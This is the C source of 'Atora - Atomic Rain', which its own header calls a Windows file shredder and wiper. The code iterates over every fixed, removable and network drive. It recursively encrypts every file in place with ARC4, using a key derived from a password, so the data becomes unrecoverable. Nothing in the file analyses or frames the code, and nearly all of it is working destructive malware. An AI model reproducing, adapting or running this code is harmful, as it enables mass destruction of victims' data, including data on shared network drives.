/*
  Name:             Atora - Atomic Rain. Windows version.
  Version:          5.61/16.01.21
  Compiler:         TCC ver 0.9.27
  Class:            Files shredder for Windows. Wiper.
  What is he doing: Encrypts all files on all local drives with a cipher ARC4
  SHA-2-256:        6d3856bcbcc37b402ea58362c60df20eddaed846d188c4a66753be267f49a3c1
  SHA-2-256_UPX:    7e5550ff5ac4fccf8c37af025119fd8153a5e6dd19d1f4f9e8c6b5198db52371
*/
#include <io.h>
#include <time.h>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <stddef.h>
#include <string.h>
#include <windows.h>

#include "KDFCLOMUL.c"

#define START_DISK 'A'
#define END_DISK   'Z'

#define STANDART_BUFFER    256
#define BUFFER_SIZE       8192
#define WIN_MAX_PATH_LEN 32767

char * PARAM_REWRITE_BYTE = "r+b";

char * expansion  = "*";
char * slash      = "\\";
char * t_one      = ".";
char * t_two      = "..";

size_t i, j;
size_t len_dir_memory = (WIN_MAX_PATH_LEN * 4);

typedef struct { /* 128 KiB == catalog */
  uint8_t new_path_of_file [WIN_MAX_PATH_LEN];
  uint8_t file_of_path     [WIN_MAX_PATH_LEN];
  uint8_t path_file        [WIN_MAX_PATH_LEN];
  uint8_t path_for_delete  [WIN_MAX_PATH_LEN];
} DIR_MEMORY;

typedef struct {
  uint8_t data       [STANDART_BUFFER];
  uint8_t secret_key [STANDART_BUFFER];
  uint8_t input      [BUFFER_SIZE];
  uint8_t output     [BUFFER_SIZE];
} MEMORY_CTX;

void swap (uint8_t * a, uint8_t * b) {
  if ((*a) != (*b)) {
    uint8_t t = *a;

    *a = *b;
    *b = t;
  }
}

void arc4_init(MEMORY_CTX * ctx, const size_t length) {

  for (i = 0; i < 256; i++)
    ctx->secret_key[i] = (uint8_t)i;

  for (i = j = 0; i < 256; i++) {
    j = (j + ctx->data[i % length] + ctx->secret_key[i]) % 256;
    swap(&ctx->secret_key[i], &ctx->secret_key[j]);
  }

  i = j = 0;
}

void arc4(MEMORY_CTX * ctx, const size_t length) {
  for (register size_t k = 0; k < length; k++) {
    i = (i + 1) % 256;
    j = (j + ctx->secret_key[i]) % 256;
    swap(&ctx->secret_key[i], &ctx->secret_key[j]);
    ctx->output[k] = ctx->input[k] ^
                     ctx->secret_key[(ctx->secret_key[i] +
                                      ctx->secret_key[j]) % 256];
  }
}

long int size_of_file(FILE * f) {
  if (fseek(f, 0, SEEK_END) != 0) {
    return (-1L);
  }

  long int result = ftell(f);

  if (fseek(f, 0, SEEK_SET) != 0) {
    return (-1L);
  }

  return result;
}

void file_encrypt(MEMORY_CTX * ctx, const char * filename) {
  FILE * file = fopen(filename, PARAM_REWRITE_BYTE);

  if (file == NULL) {
    return;
  }

  long int fsize = size_of_file(file);

  if ((fsize == -1L) || (fsize == 0)) {
    fclose(file);
    return;
  }

  long int position = 0;
  size_t   realread;

  while (position < fsize) {
    realread = fread((void *)(ctx->input), 1, BUFFER_SIZE, file);

    arc4(ctx, realread);
    fseek(file, position, SEEK_SET);

    if (fwrite((void *)(ctx->output), 1, realread, file) != realread) {
      break;
    }

    fflush(file);
    position += (long int)realread;
  }

  meminit((void *)(ctx->input),  0x00, BUFFER_SIZE);
  meminit((void *)(ctx->output), 0x00, BUFFER_SIZE);

  fclose(file);
}

void search_all_files(MEMORY_CTX * ctx, uint8_t * path, uint8_t * mask,
                                                        int pass_len) {
  WIN32_FIND_DATA wfd;
  HANDLE hfound;

  DIR_MEMORY * dir_memory = (DIR_MEMORY *)calloc(1, len_dir_memory);

  if (dir_memory == NULL) {
    return;
  }

  strcpy(dir_memory->file_of_path, path);
  strcat(dir_memory->file_of_path, slash);
  strcpy(dir_memory->path_for_delete, dir_memory->file_of_path);
  strcat(dir_memory->file_of_path, mask);

  if ((hfound = FindFirstFile(dir_memory->file_of_path, &wfd)) != INVALID_HANDLE_VALUE) {
    do {
      if ((strcmp(wfd.cFileName, t_two) != 0) && (strcmp(wfd.cFileName, t_one) != 0)) {
        if ((wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) == 0) {
          strcpy(dir_memory->path_file, dir_memory->path_for_delete);
          strcat(dir_memory->path_file, wfd.cFileName);
          /*
            Magic! 8 byte in array, this is IV!
          */
          (void)charinc(&ctx->data[pass_len], 8);
          
          arc4_init(ctx, STANDART_BUFFER);

          file_encrypt(ctx, (char *)(dir_memory->path_file));
        }
        else {
          strcpy(dir_memory->new_path_of_file, path);
          strcat(dir_memory->new_path_of_file, slash);
          strcat(dir_memory->new_path_of_file, wfd.cFileName);

          search_all_files(ctx, dir_memory->new_path_of_file, mask, pass_len);
        }
      }
    } while(FindNextFile(hfound, &wfd) != 0);
  }

  meminit((void *)dir_memory, 0x00, len_dir_memory);
  free((void *)dir_memory);
  dir_memory = NULL;

  FindClose(hfound);
}

int checklogicaldisk(const uint8_t number_disk) {
  uint8_t logical_disk[4] = "::\\";
          logical_disk[0] = number_disk;

  uint32_t result = GetDriveType(logical_disk);

  if ((result == DRIVE_FIXED) || (result == DRIVE_REMOVABLE) || (result == DRIVE_REMOTE))
    return 0;
  else
    return (-1);
}

void global (char * password, int password_len) {  
  uint8_t local_disk[] = "::";
  
  size_t memory_size = sizeof(MEMORY_CTX);
  size_t ctx_len     = sizeof(SHA256_CTX);

  srand((uint32_t)time(NULL));

  MEMORY_CTX * memory = (MEMORY_CTX *)calloc(1, memory_size);

  if (memory != NULL) {
    SHA256_CTX * sha256_ctx = (SHA256_CTX *) calloc(1, ctx_len);

    if (sha256_ctx != NULL) {
      KDFCLOMUL(sha256_ctx,
                 (unsigned char *)password,  password_len,
                 (unsigned char *)(memory->data), STANDART_BUFFER);

      meminit((void *)sha256_ctx, 0x00, ctx_len);
      free((void *)sha256_ctx);
      sha256_ctx = NULL;

      for (uint8_t disk = START_DISK; disk <= END_DISK; disk++) {
        if (checklogicaldisk(disk) == 0) {
          local_disk[0] = disk;
          search_all_files(memory, local_disk, expansion, password_len);
        }
      }
    }
    
    meminit((void *)memory, 0x00, memory_size);
    free((void *)memory);
    memory = NULL;
  }

  return;
}
